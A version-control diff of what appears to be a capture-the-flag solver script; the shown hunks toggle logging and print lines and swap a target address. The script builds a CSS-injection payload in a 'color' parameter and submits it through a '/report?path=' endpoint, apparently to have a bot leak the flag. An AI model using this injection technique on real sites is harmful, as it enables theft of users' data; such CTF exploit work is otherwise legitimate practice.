@@ -15,11 +15,11 @@ import logging
 from yaml import FlowMappingStartToken
 import sys
 
-logging.disable(logging.INFO)
+#logging.disable(logging.INFO)
 FLAG = ''
 FONT = 'Liberation Mono'
 #TARGET_URL = 'http://3.110.153.60:80'
-#TARGET_URL = 'http://3.110.153.60:8000'
+#TARGET_URL = 'http://139.59.46.128:8000'
 TARGET_URL = 'http://127.0.0.1:8000'
 PORT = 8888
 if len(sys.argv)>1:
@@ -198,9 +198,9 @@ def send_stylesheet():
     color = quote_plus(quote("blue;}\n" + s + "\nbody{color:white"))
     #res = requests.get(f"{TARGET_URL}/?sentence=Yab&color={color}")
     color = quote_plus(f"?color={color}")
-    print("Sending request")
+    #print("Sending request")
     res = requests.get(f"{TARGET_URL}/report?path={color}")
-    print("Sent request")
+    #print("Sent request")
     #print(res.url)
 
 def receive_flag():
